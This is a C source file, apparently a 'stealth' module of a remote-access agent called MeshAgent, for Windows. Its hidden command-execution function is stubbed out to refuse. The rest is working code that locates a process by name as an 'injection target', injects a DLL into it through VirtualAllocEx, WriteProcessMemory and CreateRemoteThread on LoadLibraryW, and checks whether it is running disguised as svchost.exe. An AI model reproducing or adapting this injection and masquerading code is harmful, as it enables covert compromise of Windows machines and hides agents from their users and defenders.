/*
 * MeshAgent Stealth - Hidden CMD Execution
 *
 * Provides in-memory command execution with hidden console windows
 * and full output capture without creating visible processes.
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "stealth.h"
#include "stealth_utils.h"

BOOL Stealth_ExecuteCmdHidden(const char* command, char* output, size_t outputSize)
{
    UNREFERENCED_PARAMETER(command);
    if (output != NULL && outputSize > 0) { output[0] = '\0'; }
    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
    Stealth_DebugPrintfA("Stealth_ExecuteCmdHidden blocked by rundll32-only helper policy");
    return FALSE;
}

/**
 * Find a process by name
 */
DWORD Stealth_FindInjectionTarget(const wchar_t* processName)
{
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD foundPid = 0;

    if (!processName)
    {
        return 0;
    }

    // Take snapshot of all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Get first process
    if (Process32FirstW(hSnapshot, &pe32))
    {
        do
        {
            // Check if process name matches
            if (_wcsicmp(pe32.szExeFile, processName) == 0)
            {
                foundPid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return foundPid;
}

/**
 * Inject DLL into target process
 * This is a basic implementation using CreateRemoteThread
 */
BOOL Stealth_InjectDLL(DWORD processId, const wchar_t* dllPath)
{
    HANDLE hProcess = NULL;
    LPVOID pRemoteBuf = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;
    size_t dllPathSize = 0;

    if (!dllPath || processId == 0)
    {
        return FALSE;
    }

    dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

    // Open target process
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE,
        processId
    );

    if (!hProcess)
    {
        return FALSE;
    }

    // Allocate memory in target process for DLL path
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllPathSize,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf)
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write DLL path to target process memory
    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, dllPathSize, NULL))
    {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get address of LoadLibraryW
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32)
    {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibrary)
    {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create remote thread to load DLL
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                  pRemoteBuf, 0, NULL);
    if (hThread)
    {
        // Wait for DLL to load (with timeout)
        WaitForSingleObject(hThread, 5000);
        success = TRUE;
        CloseHandle(hThread);
    }

    // Cleanup
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return success;
}

/**
 * Check if currently running inside svchost.exe
 */
BOOL Stealth_IsRunningSvchost(void)
{
    WCHAR exePath[MAX_PATH] = {0};

    // Get the path of the current process
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0)
    {
        return FALSE;
    }

    // Extract just the filename
    WCHAR* exeName = wcsrchr(exePath, L'\\');
    if (!exeName)
    {
        exeName = exePath;
    }
    else
    {
        exeName++;  // Skip the backslash
    }

    // Check if we're running as svchost.exe
    return (_wcsicmp(exeName, L"svchost.exe") == 0);
}
